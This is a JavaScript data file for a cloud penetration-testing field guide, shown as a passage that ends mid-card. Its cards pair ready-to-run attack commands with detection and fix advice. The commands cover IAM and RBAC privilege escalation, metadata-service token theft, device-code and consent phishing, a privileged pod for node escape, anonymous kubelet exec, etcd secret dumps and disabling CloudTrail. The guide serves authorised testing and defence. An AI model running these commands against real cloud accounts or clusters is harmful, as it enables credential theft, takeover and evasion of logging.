/* Cloud field guide pack: advanced techniques plus richer cards. Loaded after cloudguide.js.
   Shape: CLOUDGUIDE_PACK = { groups:[…new groups…], add:{'<existing group name>':[…cards]}, enrich:{'<existing card t>':{look,detect,fix,level}} }
   Everything here is for CTFs, bug bounty, authorised testing and defence. Commands are copyable text — nothing runs. */
const CLOUDGUIDE_PACK = {
  groups: [
    {
      name: 'AWS advanced', icon: 'route', note: 'Deeper IAM abuse: role chaining, trust-policy takeover, resource-based policies and admin-plane abuse (SSM/EKS). Pacu, CloudFox and pmapper map these automatically. Scope every call to what the keys can actually reach.',
      cards: [
        {t: 'PassRole + Lambda to escalate', provider: 'aws', body: 'iam:PassRole plus lambda:CreateFunction/InvokeFunction runs attacker code as a more privileged role, returning that role\u2019s credentials.', level: 'advanced',
          cmds: [['Create function as a role', 'aws lambda create-function --function-name p --runtime python3.12 --role <role-arn> --handler index.handler --zip-file fileb://f.zip'], ['Invoke it', 'aws lambda invoke --function-name p out.json'], ['Automate', 'pacu  # then: run iam__privesc_scan']],
          look: 'The function runs with the passed role; have it print its own metadata credentials or call sts:GetCallerIdentity to confirm the new identity.',
          detect: 'CloudTrail CreateFunction and Invoke events where the role in the request parameters is more privileged than the caller; a Lambda role suddenly making IAM/S3 calls.',
          fix: 'Scope iam:PassRole by resource ARN and a PassedToService condition so callers can only pass roles meant for that service.',
          att: 'T1548', refs: [['Pacu', 'https://github.com/RhinoSecurityLabs/pacu'], ['MITRE T1548', 'https://attack.mitre.org/techniques/T1548/']]},
        {t: 'PassRole + Glue / CloudFormation', provider: 'aws', body: 'glue:CreateJob or cloudformation:CreateStack with iam:PassRole executes your code or template as the passed role \u2014 the same primitive as the Lambda path.', level: 'advanced',
          cmds: [['Glue job as a role', 'aws glue create-job --name p --role <role-arn> --command \'{"Name":"glueetl","ScriptLocation":"s3://<bucket>/x.py"}\' --glue-version 3.0'], ['Run it', 'aws glue start-job-run --job-name p'], ['CFN as a role', 'aws cloudformation create-stack --stack-name p --template-body file://t.json --role-arn <role-arn> --capabilities CAPABILITY_NAMED_IAM']],
          look: 'The Glue script / CFN template runs with the passed role; a template with an inline IAM resource can mint an admin user or key.',
          detect: 'CloudTrail CreateJob/StartJobRun or CreateStack with iam:PassRole; CloudFormation creating IAM resources under a service role.',
          fix: 'Restrict iam:PassRole and the create APIs by resource and condition; review Glue and CloudFormation service roles for least privilege.',
          att: 'T1548'},
        {t: 'Rewrite a role trust policy', provider: 'aws', body: 'iam:UpdateAssumeRolePolicy lets you add your own principal to a privileged role\u2019s trust policy, then assume it.', level: 'advanced',
          cmds: [['Set a trust you control', 'aws iam update-assume-role-policy --role-name <role> --policy-document file://trust.json'], ['Assume it', 'aws sts assume-role --role-arn <role-arn> --role-session-name s'], ['Review trusts', 'cloudfox aws --profile <p> role-trusts']],
          look: 'trust.json lists your user/account as Principal with sts:AssumeRole; AssumeRole then returns the privileged role\u2019s temporary credentials.',
          detect: 'CloudTrail UpdateAssumeRolePolicy changing a role\u2019s trust document, immediately followed by AssumeRole from a new principal.',
          fix: 'Deny iam:UpdateAssumeRolePolicy outside a break-glass role; alert on any trust-policy change.',
          att: 'T1098.001', refs: [['CloudFox', 'https://github.com/BishopFox/cloudfox']]},
        {t: 'Cross-account role trust abuse', provider: 'aws', body: 'Roles that trust an external account with a wildcard principal or no ExternalId (confused deputy) can be assumed from outside.', level: 'advanced',
          cmds: [['List trust documents', 'aws iam list-roles --query "Roles[].[RoleName,AssumeRolePolicyDocument]"'], ['Assume with external id', 'aws sts assume-role --role-arn arn:aws:iam::<acct>:role/<role> --role-session-name s --external-id <id>'], ['Find loose trusts', 'cloudfox aws --profile <p> role-trusts']],
          look: 'A trust policy with Principal "*" or an AWS account you do not fully control, and no sts:ExternalId condition.',
          detect: 'AssumeRole events where the caller account differs from the resource account; new third-party principals assuming internal roles.',
          fix: 'Pin trusts to specific principals, require a unique ExternalId for third parties, and review with an access analyzer.',
          att: 'T1199'},
        {t: 'Resource-based policy review', provider: 'aws', body: 'S3, KMS, SQS, SNS and Lambda each carry their own resource policy that can grant cross-account or public access independent of IAM.', level: 'intermediate',
          cmds: [['S3 bucket policy', 'aws s3api get-bucket-policy --bucket <bucket>'], ['KMS key policy', 'aws kms get-key-policy --key-id <id> --policy-name default'], ['SQS / SNS', 'aws sqs get-queue-attributes --queue-url <url> --attribute-names Policy ; aws sns get-topic-attributes --topic-arn <arn>'], ['Lambda policy', 'aws lambda get-policy --function-name <F>']],
          look: 'Principal "*" or an external account in any of these = anonymous or cross-account read/write/invoke.',
          detect: 'CloudTrail PutBucketPolicy, PutKeyPolicy, SetQueueAttributes, AddPermission (Lambda/SNS) introducing a wildcard principal.',
          fix: 'Remove wildcard principals, enable S3 Block Public Access, and run IAM Access Analyzer to flag external access.',
          att: 'T1580'},
        {t: 'SSM Session Manager & RunCommand', provider: 'aws', body: 'ssm:StartSession and ssm:SendCommand run commands on managed EC2 instances as root/SYSTEM without SSH or a key pair.', level: 'intermediate',
          cmds: [['List managed instances', 'aws ssm describe-instance-information'], ['Interactive shell', 'aws ssm start-session --target <instance-id>'], ['Run a command', 'aws ssm send-command --document-name "AWS-RunShellScript" --targets Key=instanceids,Values=<instance-id> --parameters \'commands=["id","cat /root/flag"]\''], ['Read output', 'aws ssm list-command-invocations --command-id <id> --details']],
          look: 'Command output (ids, file contents) returned via list-command-invocations, or an interactive shell on the instance.',
          detect: 'CloudTrail StartSession / SendCommand events and ssm-agent logs on the host; AWS-RunShellScript invocations.',
          fix: 'Scope ssm:StartSession/SendCommand by instance tags, log sessions to S3/CloudWatch, and require approval for RunCommand.',
          att: 'T1651', refs: [['MITRE T1651', 'https://attack.mitre.org/techniques/T1651/']]},
        {t: 'EKS IAM mapping', provider: 'aws', body: 'EKS maps IAM principals to Kubernetes RBAC via the aws-auth ConfigMap or access entries; editing either grants cluster-admin.', level: 'advanced',
          cmds: [['List clusters', 'aws eks list-clusters'], ['Get kubeconfig', 'aws eks update-kubeconfig --name <cluster>'], ['Inspect aws-auth', 'kubectl -n kube-system get configmap aws-auth -o yaml'], ['Access entries', 'aws eks list-access-entries --cluster-name <cluster>'], ['Grant admin', 'aws eks associate-access-policy --cluster-name <cluster> --principal-arn <arn> --access-scope type=cluster --policy-arn arn:aws:eks::aws:cluster-access-policy/AmazonEKSClusterAdminPolicy']],
          look: 'An IAM principal you control mapped to system:masters in aws-auth, or associated with the cluster-admin access policy.',
          detect: 'CloudTrail eks:AssociateAccessPolicy/CreateAccessEntry and Kubernetes audit updates to the aws-auth ConfigMap.',
          fix: 'Restrict who can edit aws-auth / call eks:*AccessEntry, and map principals to least-privilege RBAC roles.',
          att: 'T1098'},
        {t: 'Cognito unauth identity pools', provider: 'aws', body: 'A Cognito identity pool that allows unauthenticated identities hands anonymous callers the credentials of its guest IAM role.', level: 'intermediate',
          cmds: [['Get an identity', 'aws cognito-identity get-id --identity-pool-id <region>:<pool-id>'], ['Get guest creds', 'aws cognito-identity get-credentials-for-identity --identity-id <identity-id>'], ['Use the creds', 'export AWS_ACCESS_KEY_ID=\u2026 AWS_SECRET_ACCESS_KEY=\u2026 AWS_SESSION_TOKEN=\u2026 ; aws sts get-caller-identity']],
          look: 'get-credentials-for-identity returns keys without login; the attached guest role often has far more than intended (S3, DynamoDB).',
          detect: 'CloudTrail GetCredentialsForIdentity with unauthenticated identities and subsequent calls by the Cognito guest role.',
          fix: 'Disable unauthenticated access unless required and scope the guest role to the minimum.',
          att: 'T1078.004'},
        {t: 'Organizations & SCP review', provider: 'aws', body: 'Service Control Policies set the ceiling for every account; reading the org structure shows the blast radius and any gaps in guardrails.', level: 'intermediate',
          cmds: [['Describe org', 'aws organizations describe-organization'], ['List accounts', 'aws organizations list-accounts'], ['List SCPs', 'aws organizations list-policies --filter SERVICE_CONTROL_POLICY'], ['Read an SCP', 'aws organizations describe-policy --policy-id <id>']],
          look: 'The management account, OUs and SCPs; a FullAWSAccess-only SCP means no org-level guardrails are enforced.',
          detect: 'CloudTrail organizations:Describe*/List* from a member-account principal is unusual and worth alerting on.',
          fix: 'Apply deny-based SCPs (block root, disable-logging, region lockdown) and restrict who can read org data.',
          att: 'T1087'},
        {t: 'CloudTrail evasion & detection', provider: 'aws', body: 'Attackers disable or blind logging; defenders watch for exactly those calls. Know both sides.', level: 'advanced',
          cmds: [['Check logging is on', 'aws cloudtrail get-trail-status --name <trail>'], ['List trails & selectors', 'aws cloudtrail describe-trails ; aws cloudtrail get-event-selectors --trail-name <trail>'], ['Attacker: stop logging', 'aws cloudtrail stop-logging --name <trail>  # expect to see this in alerts'], ['Attacker: delete trail', 'aws cloudtrail delete-trail --name <trail>']],
          look: 'get-trail-status showing IsLogging=false, a deleted trail, or event selectors narrowed to exclude management events.',
          detect: 'CloudTrail StopLogging, DeleteTrail, UpdateTrail and PutEventSelectors events \u2014 all high-signal; also GuardDuty Stealth findings.',
          fix: 'Use an organization trail in a locked logging account, enable log-file validation, and alert on any trail change.',
          att: 'T1562.008', refs: [['MITRE T1562.008', 'https://attack.mitre.org/techniques/T1562/008/']]}
      ]
    },
    {
      name: 'Azure & Entra advanced', icon: 'fingerprint', note: 'Identity-plane attacks: device-code and consent phishing, token refresh, managed identity, Key Vault and Conditional Access gaps. ROADtools, AzureHound and GraphRunner map the tenant; most detection is in Entra sign-in and audit logs.',
      cards: [
        {t: 'Device code phishing', provider: 'azure', body: 'The OAuth device-code flow lets an attacker start an auth request and have a victim approve it, yielding tokens for the victim. Run only in authorised red-team / awareness exercises.', level: 'advanced',
          cmds: [['TokenTactics', 'Import-Module .\\TokenTactics.psd1 ; Get-AzureToken -Client MSGraph'], ['GraphRunner', 'Invoke-DeviceCodeFlow'], ['Use the token', 'Connect-MgGraph -AccessToken $token']],
          look: 'A device code + verification URL the target enters; on approval you receive an access token and a refresh token for their account.',
          detect: 'Entra sign-in logs with authenticationProtocol = deviceCode, especially from an IP/location unlike the user\u2019s; MSGraph client id 04b07795-....',
          fix: 'Block the device-code flow in Conditional Access except for the devices that need it, and train users not to enter codes they did not start.',
          att: 'T1528', refs: [['TokenTactics', 'https://github.com/rvrsh3ll/TokenTactics'], ['GraphRunner', 'https://github.com/dafthack/GraphRunner']]},
        {t: 'Refresh-token & PRT abuse', provider: 'azure', body: 'A stolen refresh token (or Primary Refresh Token) can be traded for fresh access tokens to many resources, surviving the original session.', level: 'advanced',
          cmds: [['Refresh to Graph', 'RefreshTo-MSGraphToken -domain <tenant> -refreshToken $rt'], ['Refresh to ARM', 'RefreshTo-AzureCoreManagementToken -domain <tenant> -refreshToken $rt'], ['Decode a token', 'echo $token | cut -d. -f2 | base64 -d 2>/dev/null | jq']],
          look: 'New access tokens for different resource audiences (Graph, management, Key Vault) all minted from one refresh token.',
          detect: 'Entra sign-in logs showing token refreshes with no interactive auth, inconsistent device/IP, or impossible travel.',
          fix: 'Revoke sessions (revokeSignInSessions), require token-protection / managed devices, and shorten token lifetimes with Conditional Access.',
          att: 'T1550.001'},
        {t: 'Managed identity via IMDS (App/Function)', provider: 'azure', body: 'App Service and Functions expose managed-identity tokens through an app-local endpoint, not the VM IMDS IP; SSRF or code-exec there yields a token.', level: 'advanced',
          cmds: [['VM identity (IMDS)', 'curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-08-01&resource=https://management.azure.com/"'], ['App Service / Functions', 'curl -s -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01"'], ['Login with it', 'az login --identity']],
          look: 'A JWT access_token for the managed identity; its roles decide what you can reach (subscription, storage, Key Vault).',
          detect: 'Entra sign-ins by the managed-identity service principal from the app, then data-plane access; unexpected token requests inside the app.',
          fix: 'Give the identity least-privilege roles, keep IDENTITY_HEADER out of logs, and treat SSRF in the app as credential compromise.',
          att: 'T1552.005'},
        {t: 'Automation account & runbooks', provider: 'azure', body: 'Automation accounts store credentials and run runbooks under a Run As account or managed identity \u2014 a runbook can print those tokens.', level: 'advanced',
          cmds: [['List accounts', 'az automation account list -o table'], ['List runbooks', 'az automation runbook list --automation-account-name <A> -g <RG> -o table'], ['List stored creds', 'az automation credential list --automation-account-name <A> -g <RG>'], ['Abuse path', '# import a runbook that calls Connect-AzAccount -Identity and outputs Get-AzAccessToken']],
          look: 'Stored credential names, and a runbook you can create/edit that connects with the account\u2019s identity and emits a token.',
          detect: 'Activity log runbook create/draft/publish and job start events; Entra sign-ins by the Automation managed identity.',
          fix: 'Use managed identities with least privilege instead of Run As, restrict who can edit runbooks, and review stored credentials.',
          att: 'T1552'},
        {t: 'Key Vault: access policies vs RBAC', provider: 'azure', body: 'A vault uses either the access-policy model or Azure RBAC for its data plane; a management-plane role (e.g. Contributor) can add itself to an access policy and read secrets.', level: 'advanced',
          cmds: [['Which model', 'az keyvault show --name <V> --query properties.enableRbacAuthorization'], ['Role assignments on the vault', 'az role assignment list --scope <vault-resource-id>'], ['Grant yourself (policy model)', 'az keyvault set-policy --name <V> --object-id <your-oid> --secret-permissions get list'], ['Read a secret', 'az keyvault secret show --vault-name <V> --name <N> --query value -o tsv']],
          look: 'enableRbacAuthorization=false means access policies apply; a Contributor can self-grant secret get/list and dump the vault.',
          detect: 'Activity log VaultPatch / access-policy updates and KeyVault data-plane SecretGet events in the vault\u2019s diagnostic logs.',
          fix: 'Use RBAC authorization, separate management from data-plane roles, and enable Key Vault logging with alerts on policy changes.',
          att: 'T1555'},
        {t: 'Illicit consent grant', provider: 'azure', body: 'Tricking a user (or admin) into consenting to a malicious OAuth app grants it standing Graph access to their data without a password.', level: 'advanced',
          cmds: [['Create a lure app', 'Invoke-InjectOAuthApp -AppName "HR Portal" -ReplyUrl <url>  # GraphRunner'], ['List existing grants', 'Get-MgOauth2PermissionGrant -All'], ['List apps', 'az ad app list --all --query "[].{name:displayName,appId:appId}"']],
          look: 'An app with delegated scopes like Mail.Read or Files.ReadWrite.All granted by users; its service principal can then read their data.',
          detect: 'Entra audit events "Add OAuth2PermissionGrant" and "Consent to application"; app-only grants to unfamiliar apps.',
          fix: 'Require admin consent for all apps, restrict user consent to verified publishers and low-risk scopes, and review existing grants.',
          att: 'T1528'},
        {t: 'Dynamic group abuse', provider: 'azure', body: 'A dynamic group whose membership rule keys on a user-editable attribute lets you join it \u2014 and inherit its roles \u2014 by setting that attribute.', level: 'advanced',
          cmds: [['Find dynamic groups', 'az ad group list --query "[?membershipRule!=null].[displayName,membershipRule]" -o table'], ['Set a controllable attribute', 'az ad user update --id <UPN> --set otherMails=\'["<value-that-matches-rule>"]\''], ['Confirm membership', 'az ad user get-member-groups --id <UPN>']],
          look: 'A rule like (user.otherMails -contains "x") or on department/jobTitle where the attribute is self-service editable.',
          detect: 'Entra audit "Update user" changing an attribute, then "Add member to group" by the dynamic-membership engine.',
          fix: 'Base dynamic rules only on admin-controlled attributes and avoid granting roles to groups keyed on user-editable fields.',
          att: 'T1098'},
        {t: 'Conditional Access gap review', provider: 'azure', body: 'Conditional Access gaps \u2014 legacy auth allowed, apps without MFA, broad exclusions \u2014 are the real attack surface; enumerate the policies to find them.', level: 'intermediate',
          cmds: [['Gather tenant', 'roadrecon auth ; roadrecon gather'], ['List CA policies', 'roadrecon plugin policies'], ['Via Graph', 'Get-MgIdentityConditionalAccessPolicy | Select DisplayName,State']],
          look: 'Policies in report-only/disabled state, legacy authentication not blocked, or privileged users in exclusion groups.',
          detect: 'This is blue-team enumeration; pair with sign-in logs showing legacy-auth or no-MFA sign-ins succeeding.',
          fix: 'Block legacy auth, require MFA for all users/apps, and remove standing exclusions (use break-glass accounts instead).',
          att: 'T1556', refs: [['ROADtools', 'https://github.com/dirkjanm/ROADtools']]}
      ]
    },
    {
      name: 'GCP advanced', icon: 'waypoints', note: 'Service-account impersonation chains, default-SA scopes, org policy and workload identity federation. gcloud reads the active context; ScoutSuite and the IAM credentials API go deeper.',
      cards: [
        {t: 'Service-account impersonation chains', provider: 'gcp', body: 'iam.serviceAccounts.getAccessToken (Token Creator) lets you mint a token for another SA; chained grants let you hop SA\u2192SA toward higher privilege.', level: 'advanced',
          cmds: [['Who can impersonate what', 'gcloud iam service-accounts get-iam-policy <sa-email>'], ['Mint a token', 'gcloud auth print-access-token --impersonate-service-account=<sa-email>'], ['Chain via API', 'curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d \'{"scope":["https://www.googleapis.com/auth/cloud-platform"]}\' "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/<sa-email>:generateAccessToken"']],
          look: 'A getAccessToken response containing an access token for a more privileged SA; repeat along a chain of Token Creator bindings.',
          detect: 'Cloud Audit Logs GenerateAccessToken / GenerateIdToken on iamcredentials.googleapis.com, especially crossing projects.',
          fix: 'Remove broad roles/iam.serviceAccountTokenCreator, scope it to specific SAs, and alert on cross-project token minting.',
          att: 'T1134.001', refs: [['MITRE T1134.001', 'https://attack.mitre.org/techniques/T1134/001/']]},
        {t: 'Default SA & access scopes', provider: 'gcp', body: 'A Compute Engine VM running as the default service account with the cloud-platform scope effectively has full project access from the metadata token.', level: 'intermediate',
          cmds: [['Token scopes', 'curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes"'], ['Which SA', 'gcloud compute instances describe <vm> --zone <z> --format="value(serviceAccounts)"'], ['Project IAM for that SA', 'gcloud projects get-iam-policy <project> --flatten="bindings[].members" --filter="bindings.members:<sa-email>"']],
          look: 'Scope https://www.googleapis.com/auth/cloud-platform plus an Editor/Owner default SA = token can do nearly anything in the project.',
          detect: 'Audit-log activity by the default compute SA from a workload IP; unusual API breadth for a VM identity.',
          fix: 'Use a dedicated least-privilege SA, narrow access scopes, and avoid Editor on the default compute SA.',
          att: 'T1552.005'},
        {t: 'Org policy & hierarchy review', provider: 'gcp', body: 'Org policies are preventative guardrails across the resource hierarchy; reading them and the IAM at each level shows the real blast radius.', level: 'intermediate',
          cmds: [['List org policies', 'gcloud resource-manager org-policies list --organization <ORG_ID>'], ['Org IAM', 'gcloud organizations get-iam-policy <ORG_ID>'], ['Project ancestry', 'gcloud projects get-ancestors <project>']],
          look: 'Missing constraints (e.g. no iam.disableServiceAccountKeyCreation, no restrict on public IPs) and Owner bound high in the hierarchy.',
          detect: 'Audit-log SetOrgPolicy / SetIamPolicy at org or folder scope from an unexpected principal.',
          fix: 'Enforce key constraints at the org level, remove broad Owner grants, and restrict who can set org policy.',
          att: 'T1087'},
        {t: 'Cloud Functions / Run env secrets', provider: 'gcp', body: 'Functions and Cloud Run services often hold secrets in environment variables and run as an SA whose token is reachable from inside.', level: 'intermediate',
          cmds: [['List functions', 'gcloud functions list'], ['Env vars', 'gcloud functions describe <fn> --format="value(serviceConfig.environmentVariables)"'], ['Run service config', 'gcloud run services describe <svc> --region <r> --format=yaml'], ['Runtime SA token', '# from inside: curl -H "Metadata-Flavor: Google" .../service-accounts/default/token']],
          look: 'Env vars containing API keys/DB creds, and the runtime SA\u2019s token (via metadata) usable for further access.',
          detect: 'Audit-log functions/run describe calls, and the runtime SA appearing in logs for resources outside its job.',
          fix: 'Store secrets in Secret Manager (not env vars), run with a least-privilege SA, and restrict describe permissions.',
          att: 'T1552.007'},
        {t: 'Workload identity federation', provider: 'gcp', body: 'WIF lets external identities (GitHub OIDC, AWS) impersonate a GCP SA; a provider with a loose attribute condition lets the wrong external principals in.', level: 'advanced',
          cmds: [['List pools', 'gcloud iam workload-identity-pools list --location=global'], ['List providers', 'gcloud iam workload-identity-pools providers list --workload-identity-pool=<pool> --location=global'], ['Who can impersonate', 'gcloud iam service-accounts get-iam-policy <sa-email>']],
          look: 'A provider whose attribute mapping/condition is missing or wildcarded (e.g. any GitHub repo), letting external tokens assume the SA.',
          detect: 'Audit-log generateAccessToken / STS token exchanges originating from federated (external) identities.',
          fix: 'Constrain the provider condition to the exact repo/branch/account and bind the SA only to that principal set.',
          att: 'T1199'}
      ]
    },
    {
      name: 'Kubernetes advanced', icon: 'network', note: 'RBAC escalation, token theft, node escape, etcd and kubelet exposure, and admission gaps. Start from what the current token can do, then look for the shortest path to the node or the API. kube-hunter and peirates automate discovery.',
      cards: [
        {t: 'RBAC escalation primitives', provider: 'k8s', body: 'Certain verbs are escalation primitives: create pods (mount a privileged SA), bind/escalate (grant yourself more), and impersonate (act as another subject).', level: 'advanced',
          cmds: [['What can I do', 'kubectl auth can-i --list'], ['Check key verbs', 'kubectl auth can-i create pods ; kubectl auth can-i escalate roles ; kubectl auth can-i bind clusterroles'], ['Bind cluster-admin', 'kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --serviceaccount=<ns>:<sa>'], ['Impersonate', 'kubectl --as=system:admin get secrets -A']],
          look: 'can-i returns yes for create pods, bind, escalate or impersonate \u2014 each is a documented route to cluster-admin.',
          detect: 'API-server audit events for create clusterrolebinding/rolebinding, requests with impersonate (user/group) headers, or escalate on roles.',
          fix: 'Remove bind/escalate/impersonate and broad pod-create from low-trust roles; enforce least-privilege RBAC and review bindings.',
          att: 'T1098', refs: [['K8s RBAC', 'https://kubernetes.io/docs/reference/access-authn-authz/rbac/']]},
        {t: 'Service-account token theft', provider: 'k8s', body: 'SA tokens are mounted in pods and mintable via the TokenRequest API; a readable token for a privileged SA is a direct credential.', level: 'advanced',
          cmds: [['Local pod token', 'cat /var/run/secrets/kubernetes.io/serviceaccount/token'], ['Find legacy token secrets', 'kubectl get secrets -A --field-selector type=kubernetes.io/service-account-token'], ['Mint a token', 'kubectl create token <sa> -n <ns> --duration=24h'], ['Use it', 'curl -sk -H "Authorization: Bearer <token>" https://<api>/api/v1/secrets']],
          look: 'A token whose SA has broad RBAC (secrets, pods/exec); decode it to see the namespace and SA name.',
          detect: 'API-server audit showing a SA token used from an unexpected pod/IP, or TokenRequest create for a privileged SA.',
          fix: 'Set automountServiceAccountToken: false where not needed, scope SA RBAC tightly, and prefer short-lived bound tokens.',
          att: 'T1552.001'},
        {t: 'Node escape via crafted pod', provider: 'k8s', body: 'If you can create pods, a spec with privileged + hostPID + a hostPath mount of / gives a shell on the node and all its secrets.', level: 'advanced',
          cmds: [['Create the pod', 'kubectl run r --image=alpine --overrides=\'{"spec":{"hostPID":true,"hostNetwork":true,"containers":[{"name":"r","image":"alpine","securityContext":{"privileged":true},"volumeMounts":[{"mountPath":"/host","name":"h"}],"command":["sleep","1d"]}],"volumes":[{"name":"h","hostPath":{"path":"/"}}]}}\''], ['Chroot the node', 'kubectl exec -it r -- chroot /host sh'], ['Or nsenter init', 'kubectl exec -it r -- nsenter --target 1 --mount --uts --ipc --net --pid -- bash']],
          look: 'A root shell seeing the node filesystem under /host, kubelet credentials, and other pods\u2019 secrets.',
          detect: 'API-server audit for pods created with privileged/hostPID/hostPath; runtime alerts for nsenter/chroot on nodes.',
          fix: 'Enforce the restricted Pod Security Standard, deny hostPath/hostPID/privileged via admission, and limit pod-create RBAC.',
          att: 'T1611'},
        {t: 'etcd exposure', provider: 'k8s', body: 'etcd (tcp/2379) holds every object including Secrets in near-plaintext; an endpoint without client-cert auth leaks the whole cluster.', level: 'advanced',
          cmds: [['Anonymous read', 'ETCDCTL_API=3 etcdctl --endpoints=https://<node>:2379 get / --prefix --keys-only'], ['With client certs', 'ETCDCTL_API=3 etcdctl --endpoints=https://<node>:2379 --cacert=ca.crt --cert=c.crt --key=c.key get /registry/secrets --prefix'], ['Check the port', 'nmap -p 2379,2380 <node>']],
          look: 'Keys under /registry/secrets returning secret data; any read without mutual TLS means the datastore is wide open.',
          detect: 'Network connections to 2379 from non-control-plane hosts; etcd access logs for unexpected clients.',
          fix: 'Require client-cert auth, encrypt secrets at rest, and firewall etcd to the control plane only.',
          att: 'T1552'},
        {t: 'Kubelet anonymous auth', provider: 'k8s', body: 'A kubelet (tcp/10250) with anonymous auth enabled lets anyone list pods and exec commands in containers on that node.', level: 'advanced',
          cmds: [['List pods', 'curl -sk https://<node>:10250/pods | jq .items[].metadata.name'], ['Exec a command', 'curl -sk -X POST "https://<node>:10250/run/<ns>/<pod>/<container>" -d "cmd=id"'], ['With kubeletctl', 'kubeletctl -i --server <node> pods ; kubeletctl -i --server <node> exec "id" -p <pod> -c <container>']],
          look: 'A 200 from /pods without credentials and command output from /run = anonymous kubelet access to every container on the node.',
          detect: 'Requests to :10250 from outside the control plane; kubelet logs with system:anonymous.',
          fix: 'Set --anonymous-auth=false and --authorization-mode=Webhook on the kubelet and firewall the port.',
          att: 'T1610', refs: [['kubeletctl', 'https://github.com/cyberark/kubeletctl']]},
        {t: 'Admission & PSA gaps', provider: 'k8s', body: 'Pod Security Admission and webhook controllers decide whether dangerous pods are allowed; namespaces left at privileged (or unlabeled) permit escape-ready pods.', level: 'intermediate',
          cmds: [['PSA per namespace', 'kubectl get ns -o jsonpath=\'{range .items[*]}{.metadata.name}{"\\t"}{.metadata.labels.pod-security\\.kubernetes\\.io/enforce}{"\\n"}{end}\''], ['List webhooks', 'kubectl get validatingwebhookconfigurations ; kubectl get mutatingwebhookconfigurations'], ['Dry-run a privileged pod', 'kubectl apply --dry-run=server -f privileged-pod.yaml']],
          look: 'Namespaces with enforce=privileged or no PSA label, and no admission webhook blocking hostPath/privileged.',
          detect: 'API-server audit for pod admissions that should have been denied; changes to PSA labels or webhook configs.',
          fix: 'Label namespaces enforce=restricted, deploy an admission policy (Kyverno/Gatekeeper/PSA), and fail-closed on webhook errors.',
          att: 'T1610'}
      ]
    },
    {
      name: 'CI/CD & supply chain', icon: 'workflow', note: 'Pipelines hold cloud credentials and run untrusted input. Look at workflow triggers, OIDC trust, build logs/artifacts, dependency sources and Terraform state. All on repos/pipelines you are authorised to test.',
      cards: [
        {t: 'GitHub Actions pwn request', provider: 'web', body: 'A pull_request_target workflow that checks out and runs PR code runs with repo secrets, so a malicious PR can exfiltrate them.', level: 'advanced',
          cmds: [['Find the trigger', 'grep -rE "pull_request_target" .github/workflows/'], ['Spot the dangerous checkout', 'grep -rE "pull_request.head.(sha|ref)" .github/workflows/'], ['List workflows', 'gh api repos/<org>/<repo>/actions/workflows']],
          look: 'pull_request_target + actions/checkout of the PR head + use of secrets/env = PR-controlled code runs privileged.',
          detect: 'Workflow runs on fork PRs accessing secrets; unexpected outbound network from a build job.',
          fix: 'Avoid pull_request_target with untrusted checkout; split into an unprivileged build and a gated deploy, and require approval for fork runs.',
          att: 'T1195.002', refs: [['GitHub Actions security', 'https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions']]},
        {t: 'OIDC trust misconfig', provider: 'aws', body: 'Pipelines assume cloud roles via OIDC; a role trust with a loose or wildcard subject condition lets the wrong repo/branch assume it.', level: 'advanced',
          cmds: [['AWS role trust', 'aws iam get-role --role-name <role> --query "Role.AssumeRolePolicyDocument"'], ['Look for the sub condition', '# token.actions.githubusercontent.com:sub should pin repo:ORG/REPO:ref:refs/heads/BRANCH, not *'], ['GCP WIF provider', 'gcloud iam workload-identity-pools providers describe <p> --location=global --workload-identity-pool=<pool>']],
          look: 'A StringLike on :sub with * or only repo:org/* \u2014 any workflow in scope can mint cloud credentials.',
          detect: 'CloudTrail AssumeRoleWithWebIdentity (or GCP STS exchange) from an unexpected repo/branch subject.',
          fix: 'Pin the OIDC subject and audience to the exact repo, branch/environment, and provider; avoid wildcards.',
          att: 'T1199'},
        {t: 'Secrets in logs & artifacts', provider: 'web', body: 'Build logs and uploaded artifacts frequently leak tokens that were echoed, cached or bundled by mistake.', level: 'intermediate',
          cmds: [['List runs', 'gh run list --repo <org>/<repo>'], ['Download artifacts', 'gh run download <run-id> --repo <org>/<repo> -D artifacts/'], ['Fetch logs', 'gh api repos/<org>/<repo>/actions/runs/<id>/logs > logs.zip'], ['Scan them', 'trufflehog filesystem ./artifacts --only-verified']],
          look: 'Verified keys/tokens in log text or inside artifact files (env dumps, .npmrc, kubeconfig).',
          detect: 'GitHub secret scanning alerts; access to run logs/artifacts by unusual accounts.',
          fix: 'Mask secrets, never echo env, scope artifact retention, and rotate anything that reached a log.',
          att: 'T1552'},
        {t: 'Dependency confusion', provider: 'web', body: 'If a build references an internal package name that is not claimed on the public registry, an attacker can publish that name and have it pulled.', level: 'intermediate',
          cmds: [['List deps', 'jq \'.dependencies, .devDependencies\' package.json'], ['Check public registry', 'npm view <internal-pkg> || echo "unclaimed on public npm"'], ['PyPI check', 'pip index versions <internal-pkg> 2>&1 | head']],
          look: 'An internal/private package name with no matching public package, higher public version wins resolution.',
          detect: 'Build pulling a package from the public registry that should be internal; sudden new publisher for a known name.',
          fix: 'Use scoped names, a single private registry with public fallback disabled, and claim internal names publicly.',
          att: 'T1195.002'},
        {t: 'Terraform state exposure', provider: 'web', body: 'Terraform state stores resource attributes \u2014 including passwords and keys \u2014 in plaintext; an exposed state file leaks them.', level: 'intermediate',
          cmds: [['Find local state', 'find . -name "*.tfstate" -o -name "*.tfstate.backup"'], ['Public state bucket', 'aws s3 ls s3://<tfstate-bucket> --no-sign-request'], ['Pull secrets out', 'jq \'[.resources[].instances[].attributes | to_entries[] | select(.key|test("password|secret|key|token"))]\' terraform.tfstate']],
          look: 'State JSON with plaintext attributes (db passwords, access keys, private keys) and resource inventory.',
          detect: 'Anonymous/cross-account reads of the state bucket; state files committed to a repo (secret scanning).',
          fix: 'Use a private remote backend with encryption and locking, restrict access, and keep state out of version control.',
          att: 'T1552'}
      ]
    },
    {
      name: 'Secrets & token hunting', icon: 'scan-search', note: 'Where live credentials hide: repo history, container layers, JS bundles, and recognisable key formats. Validate before reporting, and rotate on find.',
      cards: [
        {t: 'Repo & history scanning', provider: 'web', body: 'Secrets are often removed from the tip but remain in git history; scan the whole history, not just the working tree.', level: 'intermediate',
